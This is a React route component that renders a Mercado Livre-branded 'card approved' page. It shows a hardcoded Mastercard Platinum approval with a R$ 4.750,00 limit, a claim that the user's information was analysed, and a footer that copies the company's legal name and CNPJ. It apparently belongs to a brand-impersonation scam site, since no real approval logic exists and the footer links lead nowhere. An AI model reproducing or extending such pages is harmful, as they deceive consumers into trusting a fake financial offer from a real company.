import { createFileRoute, useNavigate } from "@tanstack/react-router";
import mlLogo from "@/assets/mercado-livre-logo.png";

export const Route = createFileRoute("/cartao-aprovado")({
  head: () => ({
    meta: [
      { title: "Cartão aprovado - Mercado Livre" },
      { name: "description", content: "Seu cartão Mastercard Platinum foi aprovado com sucesso." },
    ],
  }),
  component: CartaoAprovado,
});

function CartaoAprovado() {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen bg-[#EEEEEE] flex flex-col relative overflow-hidden">
      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>

      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
      <div className="absolute w-56 h-56 rounded-full bg-[#3483FA]/10 -bottom-16 -left-16 z-0" />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8 text-center">
          <div className="w-20 h-20 rounded-full bg-[#E8F5E9] flex items-center justify-center mx-auto mb-5">
            <svg viewBox="0 0 24 24" className="w-10 h-10 text-[#00A650]" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="20 6 9 17 4 12" />
            </svg>
          </div>

          <h1 className="text-2xl md:text-3xl font-bold text-gray-800 mb-3">
            Seu cartão foi aprovado com sucesso!
          </h1>
          <p className="text-sm text-gray-600 mb-5">
            Parabéns! Você agora tem acesso a todos os benefícios exclusivos do seu novo cartão.
          </p>

          <div className="bg-gray-50 border-l-4 border-[#3483FA] rounded-md p-4 text-left text-sm text-gray-700 mb-5">
            Analisamos suas informações e notamos que este é o primeiro cartão que você solicita conosco. Sendo assim, não conseguimos liberar limites acima de R$ 5.000,00.
          </div>

          <div className="bg-gradient-to-br from-[#3483FA] to-[#2968C8] text-white rounded-xl p-6 mb-5 shadow-lg">
            <div className="text-sm opacity-90">Seu novo cartão</div>
            <div className="text-lg font-bold tracking-wide mt-1">MASTERCARD PLATINUM</div>
            <div className="text-3xl md:text-4xl font-extrabold text-[#FFE600] mt-3">R$ 4.750,00</div>
          </div>

          <button
            onClick={() => navigate({ to: "/" })}
            className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md transition-all"
          >
            Continuar
          </button>
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
          <a href="#" className="text-[#3483FA]">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
